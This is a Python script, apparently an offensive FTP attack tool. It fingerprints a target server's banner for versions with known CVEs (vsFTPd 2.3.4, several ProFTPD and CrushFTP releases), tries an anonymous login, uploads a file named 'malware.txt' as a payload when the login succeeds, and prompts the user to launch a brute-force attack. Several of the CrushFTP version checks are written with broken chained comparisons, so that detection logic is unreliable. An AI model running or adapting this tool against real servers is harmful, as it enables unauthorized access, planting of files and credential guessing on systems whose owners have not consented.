import ftplib
import os,sys,socket
from ftplib import FTP
from colorama import Fore

payload = 'malware.txt'

def anonymous(target,port):
    try:
        ftp = FTP()
        ftp.connect(target,port,timeout=60)
        
        print("[" + Fore.RED + 'FTP Version' + Fore.RESET + "] " + Fore.WHITE + ftp.getwelcome()[4:].strip('()') + Fore.RESET)
        if 'vsFTPd 2.3.4' in ftp.getwelcome():
            CVE = 'CVE-2011-2523'
            print("[" + Fore.RED + "Vulnerability Detected" + Fore.RESET + "] " + Fore.WHITE + '' + CVE + Fore.RESET)
        if 'ProFTPD 1.3.5' in ftp.getwelcome():
            CVE = 'CVE-2015-3306'
            print("[" + Fore.RED + "Vulnerability Detected" + Fore.RESET + "] " + Fore.WHITE + '' + CVE + Fore.RESET)
        if 'ProFTPD 1.3.2rc3' in ftp.getwelcome():
            CVE = 'CVE-2010-4221'
            print("[" + Fore.RED + "Vulnerability Detected" + Fore.RESET + "] " + Fore.WHITE + '' + CVE + Fore.RESET)
        if 'ProFTPD 1.3.3c' in ftp.getwelcome():
            CVE = 'CVE-2010-3867'
            print("[" + Fore.RED + "Vulnerability Detected" + Fore.RESET + "] " + Fore.WHITE + '' + CVE + Fore.RESET)
        if 'ProFTPD 1.2' in ftp.getwelcome() or 'Pro 1.3' in ftp.getwelcome():
            CVE = 'CVE-2006-5815'
            print("[" + Fore.RED + "Vulnerability Detected" + Fore.RESET + "] " + Fore.WHITE + '' + CVE + Fore.RESET)
        if 'CrushFTP 10.7.1' in ftp.getwelcome() in ftp.getwelcome():
            CVE = 'CVE-2024-4040'
            print("[" + Fore.RED + "Vulnerability Detected" + Fore.RESET + "] " + Fore.WHITE + '' + CVE + Fore.RESET)
        if 'CrushFTP 10.5.1' in ftp.getwelcome() in ftp.getwelcome():
            CVE = 'CVE-2023-43177'
            print("[" + Fore.RED + "Vulnerability Detected" + Fore.RESET + "] " + Fore.WHITE + '' + CVE + Fore.RESET)
        if 'CrushFTP 8.2.0' in ftp.getwelcome() in ftp.getwelcome():
            CVE = 'CVE-2017-14037'
            print("[" + Fore.RED + "Vulnerability Detected" + Fore.RESET + "] " + Fore.WHITE + '' + CVE + Fore.RESET)

                    
        print("[" + Fore.RED + "Attempting" + Fore.RESET + "]" + Fore.WHITE + " Anonymous Login" + Fore.RESET)     
        response = ftp.login()
        if '230' in response:
            print("[" + Fore.RED + "Vulnerable" + Fore.RESET + "] " + Fore.WHITE + "Anonymous Login Successful" + Fore.RESET)
            print(Fore.WHITE + "[" + Fore.RED + "Exploitation" + Fore.WHITE + "]" + Fore.RESET)
            print(Fore.RED + "   └──=> " + Fore.BLUE + "[*] " + Fore.WHITE + "Uploading File: " + payload + Fore.RESET)
            try:
                with open(payload, 'rb') as file:           
                    ftp.storbinary(f"STOR {payload}",file)
                    print(Fore.RED + "   └──=> " + Fore.BLUE + "[+] " + Fore.WHITE + "Uploading Successful: " + payload + Fore.RESET)
            except Exception as upload_error:
                print(Fore.RED + "   └──=> " + Fore.RED + "[!] " + Fore.WHITE + f"Upload Failed: {upload_error}" + Fore.RESET)
                
        bruteforce = input("[" + Fore.RED + "Start Bruteforce Attack? " + Fore.WHITE + "Y/N " + Fore.RESET)
        if bruteforce.upper() == "N":
            print("[" + Fore.RED + "Skipping Bruteforce" + Fore.RESET + "] " + Fore.WHITE + "Exiting")
            sys.exit()
    
    except ftplib.error_perm as perm_error:
        print("[" + Fore.RED + "Authentication Failure" + Fore.RESET + "] " + Fore.WHITE + f"{perm_error}" + Fore.RESET)
        bruteforce = input("[" + Fore.RED + "Start Bruteforce Attack? " + Fore.WHITE + "Y/N " + Fore.RESET)
        if bruteforce.upper() == "N":
            print("[" + Fore.RED + "Skipping Bruteforce" + Fore.RESET + "] " + Fore.WHITE + "Exiting")
            sys.exit()
    except ftplib.error_temp:
        print("[" + Fore.RED + "Rate Limit Detected" + Fore.RESET + "]" + " Exiting")
        sys.exit()     
    except socket.timeout:
        print("[" + Fore.RED + "Timeout" + Fore.RESET + "] " + target + Fore.RED + " May Be Blocked by Server" + Fore.RESET)
        print("[" + Fore.RED + "Initiating Program Shutdown" + Fore.RESET + "] " + "Goodbye")
        sys.exit()
    except OSError:
        print("[" + Fore.RED + "Host" + Fore.RESET + "] " + Fore.WHITE + target + Fore.RED + " Not Found" + Fore.RESET)
        print("[" + Fore.RED + "Initiating Program Shutdown" + Fore.RESET + "] " + "Goodbye")
        sys.exit()
    except Exception as e:
    	print(Fore.RED + "   └──=> " + Fore.RED + "[!] " + Fore.WHITE + f"{str(e)}\n")
        
#anonymous(host)
